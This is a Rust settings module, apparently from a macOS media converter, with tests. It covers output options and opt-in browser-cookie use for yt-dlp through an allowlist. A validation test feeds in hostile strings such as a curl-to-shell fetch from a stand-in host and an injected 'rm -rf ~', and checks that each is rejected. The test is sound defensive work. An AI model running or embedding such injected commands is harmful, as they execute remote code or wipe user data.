/// whole point of [`crate::link::SafariCookieAccess`].
pub fn safari_cookie_jar(disk: &dyn DiskFacts) -> Option<PathBuf> {
    let app = cookie_browser_app("safari")?;
    let CookieJar::Home(paths) = app.jar else { return None };
    let home = crate::tools::home_dir()?;
    let candidates: Vec<PathBuf> = paths.iter().map(|p| home.join(p)).collect();
    candidates
        .iter()
        .find(|path| disk.stat(path).is_some())
        .cloned()
        .or_else(|| candidates.into_iter().next())
}

/// Where the sign-in behind a link comes from, if anywhere.
///
/// Exactly three states, because there are exactly three answers: don't, borrow the browser's, or
/// read a file the user exported themselves. Nothing here is a password and nothing here is stored
/// by us - the first is the default and stays the default.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum CookieSource {
    /// Send no cookies at all. The default, and the only state in which nothing of the user's is
    /// read.
    #[default]
    None,
    /// Let yt-dlp read the cookie jar of a browser from [`COOKIE_BROWSERS`].
    Browser,
    /// Read a Netscape-format `cookies.txt` the user exported themselves.
    File,
}

/// How a pasted link is fetched. One group, one purpose: the sign-in yt-dlp is allowed to use.
///
/// Age-restricted videos, members-only uploads, Bilibili's higher resolutions and a genuine bot
/// check all have the same answer in yt-dlp - cookies - and no other. This is off by default and
/// stays off until somebody asks, because an app that read a browser's cookie jar merely because it
/// could would be a worse thing than a link it cannot fetch.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct LinkSettings {
    #[serde(deserialize_with = "lenient")]
    pub cookies: CookieSource,
    /// Which browser, when `cookies` is [`CookieSource::Browser`]. Checked against
    /// [`COOKIE_BROWSERS`]; anything else is refused by the shell and never reaches an argument.
    pub cookie_browser: String,
    /// The exported `cookies.txt`, when `cookies` is [`CookieSource::File`]. Absolute, or it asks
    /// for nothing.
    pub cookie_file: Option<PathBuf>,
}

/// The one thing derived from [`LinkSettings`] that is allowed to reach an argument vector.
///
/// It exists so that "the user's choice" and "the flag we run" are different types: everything that
/// could be wrong with the choice - an unknown browser, a half-typed path, a relative one - has
/// already been answered by the time one of these exists, and neither [`crate::link::fetch_args`]
/// nor [`crate::link::probe_args`] has a way to ask again and get it wrong.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CookieFlag {
    /// `--cookies-from-browser safari`, with a name that came out of [`COOKIE_BROWSERS`] and not
    /// out of the payload.
    Browser(&'static str),
    /// `--cookies /Users/me/cookies.txt`, always an absolute path.
    File(PathBuf),
}

impl LinkSettings {
    /// The cookie flag to hand yt-dlp, or `None` when this setting asks for nothing.
    ///
    /// The single place the choice is sanitised, for the reason [`TrimSettings::effective`] is the
    /// single place two numbers are: the browser name and the file path arrive from a webview, so
    /// "Safari", `chrome+gnomekeyring`, `""` and `cookies.txt` all turn up here, and the command
    /// line, the failure text and the settings page must not be able to disagree about which of
    /// them meant anything. A choice this returns `None` for is a choice the fetch runs *without*
    /// cookies; `settings_store::classify_cookies` is what tells the user which of the two it was.
    pub fn effective(&self) -> Option<CookieFlag> {
        match self.cookies {
            CookieSource::None => None,
            CookieSource::Browser => cookie_browser(&self.cookie_browser).map(CookieFlag::Browser),
            CookieSource::File => {
                // Absolute only. A relative path would be resolved against whatever directory the
                // app happened to be launched from, which is nothing a person could have meant -
                // and `Finder` launches an app from `/`.
                self.cookie_file
                    .as_deref()
                    .filter(|p| p.is_absolute())
                    .map(|p| CookieFlag::File(p.to_path_buf()))
            }
        }
    }

    /// Has the user asked us to use a sign-in at all? True even for a choice that is not finished,
    /// because the question this answers is "did they mean to", not "can we".
    pub fn wants_cookies(&self) -> bool {
        self.cookies != CookieSource::None
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum OutputLocation {
    /// Next to the original file.
    SameFolder,
    /// A `Converted` subfolder next to the original file.
    #[default]
    Subfolder,
    /// A fixed folder chosen by the user.
    Custom,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum ConflictPolicy {
    /// `clip.mp4` -> `clip (1).mp4`. Never destroys data - the default.
    #[default]
    Rename,
    Overwrite,
    Skip,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct OutputSettings {
    #[serde(deserialize_with = "lenient")]
    pub location: OutputLocation,
    pub custom_dir: Option<PathBuf>,
    pub subfolder_name: String,
    #[serde(deserialize_with = "lenient")]
    pub on_conflict: ConflictPolicy,
    /// 0 = one worker per performance core.
    pub parallel_jobs: usize,
    pub preserve_timestamps: bool,
}

impl Default for OutputSettings {
    fn default() -> Self {
        Self {
            location: OutputLocation::Subfolder,
            custom_dir: None,
            subfolder_name: "Converted".into(),
            on_conflict: ConflictPolicy::Rename,
            parallel_jobs: 0,
            preserve_timestamps: true,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Settings {
    /// Transient batch request only; never persisted by the settings store.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub crop: Option<crate::crop::CropSettings>,
    #[serde(deserialize_with = "lenient")]
    pub preset: Preset,
    pub video: VideoSettings,
    pub audio: AudioSettings,
    pub image: ImageSettings,
    pub gif: GifSettings,
    pub document: DocumentSettings,
    /// Batch-wide "cut everything to the same slice". Off by default.
    pub trim: TrimSettings,
    /// How a pasted link is fetched, i.e. whose sign-in yt-dlp may use. Off by default.
    pub link: LinkSettings,
    pub output: OutputSettings,
}

impl Default for Settings {
    fn default() -> Self {
        Self {
            crop: None,
            preset: Preset::WebAndDemo,
            video: VideoSettings::default(),
            audio: AudioSettings::default(),
            image: ImageSettings::default(),
            gif: GifSettings::default(),
            document: DocumentSettings::default(),
            trim: TrimSettings::default(),
            link: LinkSettings::default(),
            output: OutputSettings::default(),
        }
    }
}

impl Settings {
    /// CRF-style quality number for a given encoder. Lower = better.
    pub fn crf_for(&self, codec: VideoCodec) -> u32 {
        use QualityLevel::*;
        use VideoCodec::*;
        match (codec, self.video.quality) {
            (H265, Small) => 32,
            (H265, Balanced) => 28,
            (H265, High) => 24,
            (H265, Max) => 20,
            (Vp9, Small) => 38,
            (Vp9, Balanced) => 33,
            (Vp9, High) => 29,
            (Vp9, Max) => 24,
            (Av1, Small) => 42,
            (Av1, Balanced) => 36,
            (Av1, High) => 30,
            (Av1, Max) => 25,
            (_, Small) => 28,
            (_, Balanced) => 23,
            (_, High) => 20,
            (_, Max) => 17,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A Mac that does not exist, described by what `stat` would say about it.
    ///
    /// Every browser test below is built out of this rather than out of the tester's own disk: the
    /// bug this feature exists for is a *combination* of facts (a big fresh Safari jar, an empty
    /// two-day-old Chrome one, no recorded `https` handler) that no CI machine has.
    #[derive(Debug, Default, Clone)]
    struct FakeMac {
        apps: Vec<PathBuf>,
        files: Vec<(PathBuf, FileFacts)>,
    }

    impl FakeMac {
        /// An application bundle that is on this machine.
        fn app(mut self, path: &str) -> Self {
            self.apps.push(PathBuf::from(path));
            self
        }

        /// A file, with the two things a `stat` reports about it.
        fn file(mut self, path: &Path, bytes: u64, modified: SystemTime) -> Self {
            self.files.push((path.to_path_buf(), FileFacts { bytes, modified: Some(modified) }));
            self
        }

        /// One browser's cookie jar, at the place this crate says the browser keeps it.
        fn jar(self, browser: &str, bytes: u64, modified: SystemTime) -> Self {
            let app = cookie_browser_app(browser).expect("an allowlisted browser");
            let CookieJar::Home(paths) = app.jar else { panic!("{browser} has no fixed jar") };
            let path = home().join(paths[0]);
            self.file(&path, bytes, modified)
        }
    }

    impl DiskFacts for FakeMac {
        fn exists(&self, path: &Path) -> bool {
            self.apps.iter().any(|a| a == path) || self.files.iter().any(|(p, _)| p == path)
        }

        fn stat(&self, path: &Path) -> Option<FileFacts> {
            self.files.iter().find(|(p, _)| p == path).map(|(_, facts)| *facts)
        }

        fn dir_entries(&self, dir: &Path) -> Vec<PathBuf> {
            let mut found: Vec<PathBuf> = self
                .files
                .iter()
                .filter_map(|(path, _)| path.parent())
                .filter(|parent| parent.parent() == Some(dir))
                .map(Path::to_path_buf)
                .collect();
            found.sort();
            found.dedup();
            found
        }
    }

    /// The clock every browser test is measured against: a fixed instant, so "written three days
    /// ago" means the same thing in a year's time as it does today.
    fn now() -> SystemTime {
        SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1_789_000_000)
    }

    fn minutes_ago(minutes: u64) -> SystemTime {
        now() - std::time::Duration::from_secs(minutes * 60)
    }

    fn days_ago(days: u64) -> SystemTime {
        now() - std::time::Duration::from_secs(days * 86_400)
    }

    fn home() -> PathBuf {
        crate::tools::home_dir().expect("a HOME to expand")
    }

    /// A Mac with Safari on it, which every Mac is: Safari cannot be removed.
    fn mac() -> FakeMac {
        FakeMac::default().app("/Applications/Safari.app")
    }

    fn presence(mac: FakeMac, default_browser: Option<&str>) -> Vec<BrowserPresence> {
        cookie_browser_presence(&mac, default_browser, now())
    }

    fn row<'a>(rows: &'a [BrowserPresence], id: &str) -> &'a BrowserPresence {
        rows.iter().find(|r| r.id == id).unwrap_or_else(|| panic!("no row for `{id}`"))
    }

    #[test]
    fn default_is_the_web_preset() {
        let d = Settings::default();
        assert_eq!(d, Preset::WebAndDemo.settings());
        assert_eq!(d.video.max_height, Some(1080));
        assert!(d.video.faststart, "faststart must be on for web delivery");
        assert_eq!(d.output.on_conflict, ConflictPolicy::Rename, "never overwrite by default");
    }

    #[test]
    fn presets_move_quality_in_the_expected_direction() {
        let small = Preset::Smallest.settings();
        let hq = Preset::HighQuality.settings();
        assert!(small.image.quality < hq.image.quality);
        assert!(small.crf_for(VideoCodec::H264) > hq.crf_for(VideoCodec::H264));
        assert!(hq.video.max_height.is_none());
        assert_eq!(Preset::Archive.settings().audio.codec, AudioCodec::Flac);
    }

    #[test]
    fn settings_round_trip_through_json() {
        let s = Preset::Smallest.settings();
        let json = serde_json::to_string(&s).unwrap();
        assert_eq!(serde_json::from_str::<Settings>(&json).unwrap(), s);
        // partial payloads from the UI fall back to defaults
        let partial: Settings = serde_json::from_str(r#"{"image":{"quality":50}}"#).unwrap();
        assert_eq!(partial.image.quality, 50);
        assert_eq!(partial.image.max_dimension, Some(2560));
    }

    /// A settings file written by a *newer* build of this app - a preset we do not have, a codec
    /// we have never heard of, a whole section that did not exist - used to fail to parse, and a
    /// settings file that does not parse is thrown away: the user downgrades once and loses every
    /// preference they ever set. Each value we cannot read costs exactly that value.
    #[test]
    fn a_settings_file_from_a_future_version_degrades_one_value_at_a_time() {
        let from_the_future = r#"{
            "preset": "cinema_4k",
            "video": {
                "codec": "h266",
                "quality": "ludicrous",
                "hardware_accel": "neural_engine",
                "max_height": 720,
                "faststart": false,
                "spatial_video": true
            },
            "audio": { "codec": "mp3", "bitrate_kbps": 320, "dolby_atmos": "on" },
            "output": {
                "location": "straight_to_the_cloud",
                "on_conflict": "ask_me_every_time",
                "subfolder_name": "Done",
                "parallel_jobs": 3
            },
            "captions": { "burn_in": true }
        }"#;
        let s: Settings =
            serde_json::from_str(from_the_future).expect("a newer file must still load");

        // Values this version cannot understand become this version's defaults...
        assert_eq!(s.preset, Preset::WebAndDemo);
        assert_eq!(s.video.codec, VideoCodec::Auto);
        assert_eq!(s.video.quality, QualityLevel::Balanced);
        assert_eq!(s.video.hardware_accel, HardwareAccel::Auto);
        assert_eq!(s.output.location, OutputLocation::Subfolder);
        assert_eq!(s.output.on_conflict, ConflictPolicy::Rename, "never overwrite by accident");
        // ...and everything else the user chose is still theirs, including the fields sitting
        // beside an unreadable one and the sections that are new to us entirely.
        assert_eq!(s.video.max_height, Some(720));
        assert!(!s.video.faststart);
        assert_eq!(s.audio.codec, AudioCodec::Mp3);
        assert_eq!(s.audio.bitrate_kbps, 320);
        assert_eq!(s.output.subfolder_name, "Done");
        assert_eq!(s.output.parallel_jobs, 3);

        // A known variant is still read as itself - leniency must not swallow real values.
        let known: Settings =
            serde_json::from_str(r#"{"video":{"codec":"av1"},"output":{"on_conflict":"skip"}}"#)
                .unwrap();
        assert_eq!(known.video.codec, VideoCodec::Av1);
        assert_eq!(known.output.on_conflict, ConflictPolicy::Skip);
    }

    /// The shape the UI binds to, and the promise that nothing is trimmed unless somebody asked.
    #[test]
    fn a_trim_is_off_by_default_and_ten_seconds_long() {
        let t = TrimSettings::default();
        assert!(!t.enabled, "no batch may be shortened by accident");
        assert_eq!(t.start_secs, 0.0);
        assert_eq!(t.length_secs, 10.0);
        assert_eq!(Settings::default().trim, t);
        assert_eq!(t.effective(), None, "disabled means no arguments at all");

        // Serialised snake_case beside every other group, and read back as itself.
        let json = serde_json::to_value(Settings::default()).unwrap();
        assert_eq!(json["trim"]["enabled"], false);
        assert_eq!(json["trim"]["start_secs"], 0.0);
        assert_eq!(json["trim"]["length_secs"], 10.0);
        let sent: Settings =
            serde_json::from_str(r#"{"trim":{"enabled":true,"start_secs":30,"length_secs":10}}"#)
                .unwrap();
        assert_eq!(sent.trim, TrimSettings { enabled: true, start_secs: 30.0, length_secs: 10.0 });
        // ...and a settings file that predates the feature simply has no trim.
        let older: Settings = serde_json::from_str(r#"{"image":{"quality":50}}"#).unwrap();
        assert_eq!(older.trim, TrimSettings::default());
    }

    /// The number the progress bar and the ETA are measured against.
    #[test]
    fn the_expected_output_length_is_the_slice_the_user_will_get() {
        let trim = |start: f64, length: f64| TrimSettings {
            enabled: true,
            start_secs: start,
            length_secs: length,
        };

        // The headline case: 10 seconds of a 10 minute film is 10 seconds of work.
        assert_eq!(trim(30.0, 10.0).expected_output_secs(Some(600.0)), Some(10.0));
        // A source shorter than the trim keeps its own length - no padding, no special case.
        assert_eq!(trim(0.0, 10.0).expected_output_secs(Some(6.0)), Some(6.0));
        // A length longer than what is left after the start point is capped by the tail.
        assert_eq!(trim(5.0, 100.0).expected_output_secs(Some(20.0)), Some(15.0));
        // A start beyond the end leaves nothing; the queue refuses that row rather than encoding 0s.
        assert_eq!(trim(30.0, 10.0).expected_output_secs(Some(12.0)), Some(0.0));
        assert!(trim(30.0, 10.0).starts_past_the_end(12.0));
        assert!(
            trim(12.0, 10.0).starts_past_the_end(12.0),
            "starting *at* the end is also nothing"
        );
        assert!(!trim(11.9, 10.0).starts_past_the_end(12.0));

        // No trim: the source's own duration, untouched.
        assert_eq!(TrimSettings::default().expected_output_secs(Some(600.0)), Some(600.0));
        assert!(!TrimSettings::default().starts_past_the_end(600.0));
        // An unknown duration stays unknown - an indeterminate bar beats a guessed one.
        assert_eq!(trim(0.0, 10.0).expected_output_secs(None), None);
        assert!(!trim(0.0, 10.0).starts_past_the_end(0.0), "nothing is known about a 0s source");
    }

    /// Numbers from a text field. None of these may become a command line argument, and none of them
    /// may make the app act on a trim the user cannot see.
    #[test]
    fn a_trim_with_impossible_numbers_asks_for_nothing() {
        for bad in [f64::NAN, f64::INFINITY, -1.0, 0.0] {
            let t = TrimSettings { enabled: true, start_secs: 0.0, length_secs: bad };
            assert_eq!(t.effective(), None, "length {bad}");
            assert_eq!(t.expected_output_secs(Some(60.0)), Some(60.0), "length {bad}");
        }
        // A start that is not a number is 0, not a refusal: the length is what the user asked for.
        for bad in [f64::NAN, f64::NEG_INFINITY, -30.0] {
            let t = TrimSettings { enabled: true, start_secs: bad, length_secs: 10.0 };
            assert_eq!(t.effective(), Some((0.0, 10.0)), "start {bad}");
        }
        // Both ends are capped at a day, so `-ss`/`-t` are always a plausible duration.
        let huge = TrimSettings { enabled: true, start_secs: 1e30, length_secs: 1e30 };
        assert_eq!(huge.effective(), Some((MAX_TRIM_SECS, MAX_TRIM_SECS)));
    }

    /// A preset is a quality choice. It has no opinion about which 10 seconds of the clip the user
    /// wants, so it neither sets nor carries a trim: `commands::apply_preset` is what keeps the
    /// user's own trim across a preset click.
    #[test]
    fn a_preset_has_no_opinion_about_trimming() {
        for preset in Preset::ALL {
            assert_eq!(preset.settings().trim, TrimSettings::default(), "{}", preset.id());
            assert_eq!(preset.settings().link, LinkSettings::default(), "{}", preset.id());
        }
    }

    /// The shape the settings drawer binds to, and the promise underneath it: nobody's cookie jar
    /// is read unless they asked for it.
    #[test]
    fn a_link_fetch_borrows_no_sign_in_by_default() {
        let l = LinkSettings::default();
        assert_eq!(l.cookies, CookieSource::None, "no cookie jar may be read by accident");
        assert_eq!(l.cookie_browser, "");
        assert_eq!(l.cookie_file, None);
        assert_eq!(l.effective(), None, "off means no arguments at all");
        assert!(!l.wants_cookies());
        assert_eq!(Settings::default().link, l);

        // Serialised snake_case beside every other group, and read back as itself.
        let json = serde_json::to_value(Settings::default()).unwrap();
        assert_eq!(json["link"]["cookies"], "none");
        assert_eq!(json["link"]["cookie_browser"], "");
        assert!(json["link"]["cookie_file"].is_null());

        let sent: Settings =
            serde_json::from_str(r#"{"link":{"cookies":"browser","cookie_browser":"chrome"}}"#)
                .unwrap();
        assert_eq!(sent.link.cookies, CookieSource::Browser);
        assert_eq!(sent.link.effective(), Some(CookieFlag::Browser("chrome")));
        assert!(sent.link.wants_cookies());
        let from_file: Settings = serde_json::from_str(
            r#"{"link":{"cookies":"file","cookie_file":"/Users/me/cookies.txt"}}"#,
        )
        .unwrap();
        assert_eq!(
            from_file.link.effective(),
            Some(CookieFlag::File(PathBuf::from("/Users/me/cookies.txt")))
        );

        // ...and a settings file that predates the feature simply borrows nothing.
        let older: Settings = serde_json::from_str(r#"{"image":{"quality":50}}"#).unwrap();
        assert_eq!(older.link, LinkSettings::default());
        // An unreadable mode costs that one value, like every other enum in this file.
        let future: Settings =
            serde_json::from_str(r#"{"link":{"cookies":"from_the_keychain"}}"#).unwrap();
        assert_eq!(future.link.cookies, CookieSource::None, "never read a jar on a guess");
    }

    /// The allowlist, and the property it exists for: what reaches an argument vector is one of
    /// *our* strings, never the one that came over IPC.
    #[test]
    fn only_a_browser_on_the_allowlist_can_become_a_flag() {
        // yt-dlp's own spellings, as `--cookies-from-browser --help` lists them.
        assert_eq!(
            COOKIE_BROWSERS,
            &["safari", "chrome", "chromium", "edge", "brave", "firefox", "vivaldi", "opera"]
        );
        for name in COOKIE_BROWSERS {
            assert_eq!(cookie_browser(name), Some(*name));
            // A label from a dropdown, and a value with the whitespace a text field leaves behind.
            let shouty: String = name.to_uppercase();
            assert_eq!(cookie_browser(&shouty), Some(*name));
            assert_eq!(cookie_browser(&format!("  {name} ")), Some(*name));
        }
        // Everything else, including yt-dlp syntax we deliberately do not expose and strings that
        // would be read as options if they ever got out.
        for crafted in [
            "",
            "   ",
            "whale",
            "internet explorer",
            "chrome+gnomekeyring",
            "chrome:Profile 2",
            "safari::none",
            "--exec=curl evil.test|sh",
            "-oExec",
            "chrome;rm -rf ~",
        ] {
            assert_eq!(cookie_browser(crafted), None, "`{crafted}`");
            let asked = LinkSettings {
                cookies: CookieSource::Browser,
                cookie_browser: crafted.into(),
                cookie_file: None,
            };
            assert_eq!(asked.effective(), None, "`{crafted}` must never become a flag");
            // The user still *meant* to use a sign-in, which is what the shell reports on.
            assert!(asked.wants_cookies(), "`{crafted}`");
        }
    }

    /// The other half of the allowlist, and the reason the recovery flow can offer a browser the
    /// user actually has: every name that may become a `--cookies-from-browser` flag also has a
    /// label to say and an application bundle to look for, and nothing else does.
    #[test]
    fn every_allowlisted_browser_has_a_bundle_name() {
        assert_eq!(COOKIE_BROWSER_APPS.len(), COOKIE_BROWSERS.len(), "{COOKIE_BROWSER_APPS:?}");
        for name in COOKIE_BROWSERS {
            let app = cookie_browser_app(name).unwrap_or_else(|| {
                panic!("`{name}` is on the allowlist with no application bundle")
            });
            // A bundle is a directory macOS launches, so the name has to end in `.app` - and it is
            // the installer's name, not the browser's: `Google Chrome.app`, `Brave Browser.app`.
            assert!(app.bundle.ends_with(".app"), "`{name}` -> `{}`", app.bundle);
            assert!(!app.label.is_empty() && !app.label.contains(".app"), "{app:?}");
            // The label is what a sentence says, so it must not be yt-dlp's lower-case spelling.
            assert_eq!(app.label.to_ascii_lowercase(), *name, "{app:?}");
            assert!(app.label.starts_with(|c: char| c.is_ascii_uppercase()), "{app:?}");
            // The identifier LaunchServices records, which is how the default browser is read.
            assert!(app.bundle_id.split('.').count() >= 3, "{app:?}");
            assert!(!app.bundle_id.ends_with(".app"), "an identifier is not a bundle: {app:?}");
            // Every jar path is relative to `$HOME` (an absolute one would ignore the user) and
            // names a file rather than a directory.
            let paths: Vec<&str> = match app.jar {
                CookieJar::Home(paths) => paths.to_vec(),
                CookieJar::Profiles { dir, file } => vec![dir, file],
            };
            for path in paths {
                assert!(!path.starts_with('/') && !path.contains(".."), "{app:?} -> `{path}`");
                assert!(path.starts_with("Library/") || !path.contains('/'), "`{path}`");
            }
        }
        // ...and nothing is named here that could never become a flag.
        for app in COOKIE_BROWSER_APPS {
            assert_eq!(cookie_browser(app.id), Some(app.id), "`{}` is not allowlisted", app.id);
        }
        // Case-insensitive on the way in, exactly like `cookie_browser`: a dropdown may send its
        // own label back.
        assert_eq!(cookie_browser_app("Chrome").map(|a| a.bundle), Some("Google Chrome.app"));
        assert_eq!(cookie_browser_app("chrome:Profile 2"), None);
        // Safari is the one jar behind a permission, and the only row that says so.
        let safari = cookie_browser_app("safari").expect("safari");
        assert!(
            matches!(safari.jar, CookieJar::Home(paths) if paths[0].contains("binarycookies")),
            "{safari:?}"
        );
    }

    /// The LaunchServices rule, including the half that was wrong: **an absent handler is Safari**.
    ///
    /// Measured on the Mac this change comes from - macOS 26.6.2, whose
    /// `com.apple.launchservices.secure.plist` holds six URL scheme handlers (`seal`, `codex`,
    /// `aime`, `corplink`, `feilian`, `sealsuite`) and not one entry for `https` or `http`. Its
    /// owner's default browser is Safari, and the app used to answer "unknowable" and offer them
    /// Chrome.
    #[test]
    fn no_recorded_https_handler_means_the_default_browser_is_safari() {
        assert_eq!(default_browser_from_handler(None), Some("safari"));
        // An entry that is there but empty is an entry that says nothing.
        assert_eq!(default_browser_from_handler(Some("")), Some("safari"));
        assert_eq!(default_browser_from_handler(Some("   ")), Some("safari"));

        // A default the user did change, in the case LaunchServices writes it in (lower) and the
        // case the app's own `Info.plist` uses.
        for (recorded, expected) in [
            ("com.google.chrome", "chrome"),
            ("com.google.Chrome", "chrome"),
            ("com.apple.Safari", "safari"),
            ("org.mozilla.firefox", "firefox"),
            ("com.microsoft.edgemac", "edge"),
            ("com.brave.Browser", "brave"),
            ("com.operasoftware.Opera", "opera"),
            ("com.vivaldi.Vivaldi", "vivaldi"),
            ("org.chromium.Chromium", "chromium"),
        ] {
            assert_eq!(default_browser_from_handler(Some(recorded)), Some(expected), "{recorded}");
        }

        // A default we cannot borrow a sign-in from is `None` - not the next best guess.
        for other in ["company.thebrowser.Browser", "org.torproject.torbrowser", "not.a.browser"] {
            assert_eq!(default_browser_from_handler(Some(other)), None, "{other}");
        }
    }

    /// What the machine is asked, and the shape the recovery flow reads: eight rows in allowlist
    /// order, and the truth about each one.
    ///
    /// The Mac this was measured on has exactly one third-party browser (Chrome), which is the
    /// whole point - a dropdown of eight is seven options that cannot work.
    #[test]
    fn only_the_browsers_that_are_really_installed_are_reported_as_installed() {
        let rows = presence(mac().app("/Applications/Google Chrome.app"), None);
        let ids: Vec<&str> = rows.iter().map(|r| r.id).collect();
        assert_eq!(ids, COOKIE_BROWSERS.to_vec(), "every browser is reported, in allowlist order");

        let installed: Vec<&str> = rows.iter().filter(|r| r.installed).map(|r| r.label).collect();
        assert_eq!(installed, vec!["Safari", "Chrome"]);
        let chrome = row(&rows, "chrome");
        assert_eq!(chrome.app_path, Some(PathBuf::from("/Applications/Google Chrome.app")));
        // A browser that is not there says so and points nowhere.
        let firefox = row(&rows, "firefox");
        assert!(!firefox.installed && firefox.app_path.is_none(), "{firefox:?}");

        // `~/Applications` is looked in too - a browser installed without an administrator
        // password is still a browser the user can sign in with.
        let own = home().join("Applications/Firefox.app");
        let rows = presence(FakeMac::default().app(own.to_str().expect("utf-8")), None);
        let firefox = row(&rows, "firefox");
        assert_eq!(firefox.app_path.as_deref(), Some(own.as_path()));
        assert_eq!(rows.iter().filter(|r| r.installed).count(), 1, "{rows:#?}");

        // A machine with nothing at all is a list of eight honest "no"s, not an empty answer.
        let bare = presence(FakeMac::default(), None);
        assert_eq!(bare.len(), COOKIE_BROWSERS.len());
        assert!(bare.iter().all(|r| !r.installed && r.app_path.is_none()), "{bare:#?}");
        assert!(bare.iter().all(|r| !r.cookie_store_exists && r.cookie_store.is_none()));
        // Nothing is worth offering, and nothing is offered. Every row still has a rank, so the
        // caller never has to invent an order of its own.
        assert!(bare.iter().all(|r| !r.recommended), "{bare:#?}");
        let mut ranks: Vec<usize> = bare.iter().map(|r| r.rank).collect();
        ranks.sort_unstable();
        assert_eq!(ranks, (1..=COOKIE_BROWSERS.len()).collect::<Vec<_>>());
    }

    /// The bug, reproduced from the user's own Mac, and the rule that fixes it.
    ///
    /// Measured there: Safari's jar is 345,981 bytes and was written minutes ago; Chrome's is
    /// 65,536 bytes - a freshly created empty SQLite database - last touched two days earlier; and
    /// LaunchServices records no `https` handler, so the default browser is Safari. The old rule
    /// preferred "any installed browser that is not Safari", because Safari's jar costs a Full
    /// Disk Access grant, and so offered to borrow a sign-in that had never been made.
    #[test]
    fn the_browser_offered_is_the_one_with_the_sign_in_in_it_not_the_cheapest_one_to_read() {
        let users_mac = mac()
            .app("/Applications/Google Chrome.app")
            .jar("safari", 345_981, minutes_ago(3))
            .jar("chrome", 65_536, days_ago(2));
        let rows = presence(users_mac, default_browser_from_handler(None));

        let safari = row(&rows, "safari");
        let chrome = row(&rows, "chrome");
        assert_eq!(safari.rank, 1, "the jar with the sign-in in it wins: {rows:#?}");
        assert_eq!(chrome.rank, 2, "{rows:#?}");
        assert!(safari.recommended && !chrome.recommended, "{rows:#?}");
        // ...and every fact behind that verdict is on the row, so the sentence can be specific.
        assert!(safari.is_default && !chrome.is_default);
        assert!(safari.needs_full_disk_access && !chrome.needs_full_disk_access);
        assert_eq!(safari.cookie_store_bytes, Some(345_981));
        assert_eq!(chrome.cookie_store_bytes, Some(65_536));
        assert!(safari.cookie_store_exists && chrome.cookie_store_exists);
        assert_eq!(
            safari.cookie_store,
            Some(home().join(
                "Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies"
            ))
        );
        assert!(safari.cookie_store_modified > chrome.cookie_store_modified);

        // The permission cost is a fact to mention, never a place in the order: give Chrome a jar
        // with something in it, written more recently, and Chrome wins on that evidence alone.
        let other_way = presence(
            mac().app("/Applications/Google Chrome.app").jar("safari", 345_981, days_ago(90)).jar(
                "chrome",
                4_500_000,
                minutes_ago(2),
            ),
            default_browser_from_handler(None),
        );
        assert_eq!(row(&other_way, "chrome").rank, 1, "{other_way:#?}");
        assert!(row(&other_way, "chrome").recommended);
        assert!(row(&other_way, "safari").is_default, "still the default, still second");
    }

    /// The three things that put a browser below another, each on its own.
    #[test]
    fn an_empty_or_stale_or_missing_cookie_store_never_outranks_a_used_one() {
        // 1. Installed with no jar at all cannot be offered, however new the browser is.
        let rows = presence(
            mac().app("/Applications/Google Chrome.app").app("/Applications/Firefox.app").jar(
                "chrome",
                900_000,
                days_ago(20),
            ),
            None,
        );
        assert_eq!(row(&rows, "chrome").rank, 1, "{rows:#?}");
        assert!(row(&rows, "firefox").rank > row(&rows, "chrome").rank);
        assert!(!row(&rows, "firefox").recommended && !row(&rows, "firefox").cookie_store_exists);

        // 2. An empty jar loses to a used one even when the empty one was written this minute:
        //    65,536 bytes of SQLite schema is not a sign-in, whenever it was created.
        let rows = presence(
            mac()
                .app("/Applications/Google Chrome.app")
                .jar("chrome", EMPTY_COOKIE_STORE_BYTES, minutes_ago(1))
                .jar("safari", 200_000, days_ago(5)),
            None,
        );
        assert_eq!(row(&rows, "safari").rank, 1, "{rows:#?}");

        // 3. Between two used jars, the fresher band wins - and inside one band, the user's
        //    default browser is the tie-break rather than four hours of coincidence.
        let rows = presence(
            mac()
                .app("/Applications/Google Chrome.app")
                .jar("chrome", 900_000, minutes_ago(30))
                .jar("safari", 900_000, days_ago(60)),
            Some("safari"),
        );
        assert_eq!(row(&rows, "chrome").rank, 1, "a stale jar loses whoever it belongs to");
        let rows = presence(
            mac()
                .app("/Applications/Google Chrome.app")
                .jar("chrome", 900_000, minutes_ago(30))
                .jar("safari", 900_000, days_ago(2)),
            Some("safari"),
        );
        assert_eq!(row(&rows, "safari").rank, 1, "same week, so the default browser decides");
    }

    /// Firefox keeps one jar per profile under names nobody can predict, so the newest is the one
    /// reported - and a directory listing is as far as that goes.
    #[test]
    fn firefoxs_most_recently_written_profile_is_the_jar_that_is_reported() {
        let profiles = home().join("Library/Application Support/Firefox/Profiles");
        let old = profiles.join("abc123.default").join("cookies.sqlite");
        let current = profiles.join("zzz999.default-release").join("cookies.sqlite");
        let mac = FakeMac::default()
            .app("/Applications/Firefox.app")
            .file(&old, 500_000, days_ago(200))
            .file(&current, 300_000, days_ago(1));
        let rows = presence(mac, None);
        let firefox = row(&rows, "firefox");
        assert_eq!(firefox.cookie_store.as_deref(), Some(current.as_path()), "{firefox:?}");
        assert_eq!(firefox.cookie_store_bytes, Some(300_000));
        assert_eq!(firefox.rank, 1);
        assert!(firefox.recommended);
    }

    /// Where Safari's jar is, found by `stat` and never by opening it. The container path is the
    /// modern one; the pre-sandbox location is still there on an upgraded Mac.
    #[test]
    fn safaris_cookie_jar_is_located_without_being_opened() {
        let container = home()
            .join("Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies");
        let legacy = home().join("Library/Cookies/Cookies.binarycookies");

        // Nothing on the disk at all: the current location, so the caller's `open` can say
        // "no such file" for itself.
        assert_eq!(safari_cookie_jar(&FakeMac::default()), Some(container.clone()));
